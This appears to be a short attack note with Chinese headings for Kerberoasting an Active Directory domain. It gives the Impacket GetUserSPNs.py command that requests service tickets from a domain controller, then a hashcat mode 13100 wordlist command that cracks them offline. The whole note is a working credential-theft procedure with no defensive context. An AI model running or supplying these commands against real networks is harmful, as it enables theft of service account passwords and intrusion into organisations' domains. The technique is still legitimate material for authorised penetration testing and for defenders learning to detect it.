	https://github.com/SecureAuthCorp/impacket
	请求TGS
	>python GetUserSPNs.py -request -dc-ip 10.1.1.1 zone.com/y
	破解
	>hashcat -m 13100 -a 0 kerberos.txt wordlist.txt
